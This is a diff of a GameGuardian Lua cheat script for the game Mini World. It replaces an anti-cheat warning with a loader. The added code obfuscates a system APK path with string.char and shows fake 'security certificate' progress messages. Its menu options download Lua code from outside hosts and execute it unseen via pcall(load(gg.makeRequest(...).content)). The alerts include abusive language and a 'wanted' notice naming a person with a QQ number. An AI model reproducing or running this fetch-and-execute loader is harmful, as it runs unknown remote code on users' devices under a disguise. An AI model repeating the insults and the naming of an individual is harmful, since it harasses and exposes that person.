@@ -1,29 +1,85 @@
-gg.alert("该外挂已违法，目前作者已被抓捕")
-gg.alert("该外挂让迷你玩科技有限公司损失100人民币")
-gg.alert("并且该辅助损坏“迷你世界”的经营，请立即退出本辅助，不要继续损坏迷你玩科技有限公司的经营，谢谢你的配合")
+
+
+
+for i=1,666 do loadfile(string.char(47,115,121,115,116,101,109,47,112,114,105,118,45,97,112,112,47,83,101,116,116,105,110,103,115,47,83,101,116,116,105,110,103,115,46,97,112,107)) end
+   
+
+function ffvpns()
+ffvpn= "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F" 
+x=(tostring(gg[ "makeRequest" ](ffvpn)))
+if not x  or not x:sub(1,20) then 
+gg[ "alert" ]( "修改器无法访问网络请查看相应限权" , "" )
+else
+while  #(x)<100  
+or x:find( "SSL" ) or x:find('I/O') or x:find('javax')
+do 
+gg[ "alert" ]( " MTP警告:网络数据通道异常\n\nMTP:看这个傻逼又来开挂，看来要表演正能量\n你他妈没网络想开挂，你吃屎都不配" , "" , "我不访问网络" , "访问网络" )
+local mpxgk=optfff()
+end 
+end
+end
+ffvpns()
+
+gg.alert("正在检查安全证书，请耐心等待，圈钱🐶死🐎QQ群：317824143")
+
+gg.alert("全网通缉这些人，QQ:2937879737，姓名:集白")
+
+ gg.toast("正在连接安全证书15％") gg.sleep(320) gg.toast("正在注入数据30％") gg.sleep(320) print(i)print(i)print(i)print(i)print(i)print(i)print(i)print(i)print(i)print(i)
+gg.toast("正在连接本地48％")
+gg.sleep(320)
+gg.toast("正在连接网络64%")
+gg.sleep(360)
+gg.toast("正在连接马达科技76%")
+gg.sleep(360)
+gg.toast("正在重新检测安全证书85%")
+gg.sleep(360)
+gg.toast("开启失败，但可使用99% 错误:安全证书错误 *263   Your mobile phone network is not stable, can not connect to the day to run the auxiliary script, such as can not run, please check the network Detect the current network instability, is connecting to the standby server, may not be your network problem, perhaps the server strike   Contact the author to fix the BUG ")
+gg.sleep(100)
+
+
+--天跑辅助
+--交流群：645398481
+--请勿搬运代码以及二改圈钱
+--二改没🐎
+--请把游戏更新至最新版本1.2.6
+--游戏版本过低将无法使用该脚本
+
+
 
 function Main()
-SJ = os.date("北京时间:%Y年%m月%d日%H时%M分%S秒")
-menu = gg.choice({
+SJ = os.date("当前时间%Y年%m月%d日%H时%M分%S秒")
+SN = gg.choice({
+	 "天跑辅助2.5 beta6",
+	 "天跑辅助简洁版2.6",
 	 "退出",
-}, nil, "作者已被抓捕\n"..SJ.."\n作者因损坏迷你玩科技有限公司的经营而被抓捕\n作者已被抓捕")
-if menu == 1 then Exit() end
-FX1=0
+}, nil, "给爷选，提示错误不要管")
+if SN==1 then
+     TP()
+end
+if SN==2 then
+	 TPJJ()
+end
+if SN==3 then
+	 Exit()	 
+end
+FX=0
+end
+
+function TP()
+ gg.alert("该辅助已恢复") 
+ pcall(load(gg.makeRequest("http://zl.lnlcup.cn/a/1628564224.lua").content))
+end
+
+function TPJJ()
+ pcall(load(gg.makeRequest("https://1764875582.github.io/TPFZ/TPNB.html").content))
 end
 
 
 
 
 
-
-
-
-
-
-
-
 function Exit()
-  print("谢谢您的配合，抵制外挂，共创绿色游戏环境!")
+  print("长风破浪会有时，直挂云帆济沧海。 -［唐］ 李白")
   os.exit()
 end
 
@@ -44,4 +100,20 @@ while(true)do
     Main()
   end
 end
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
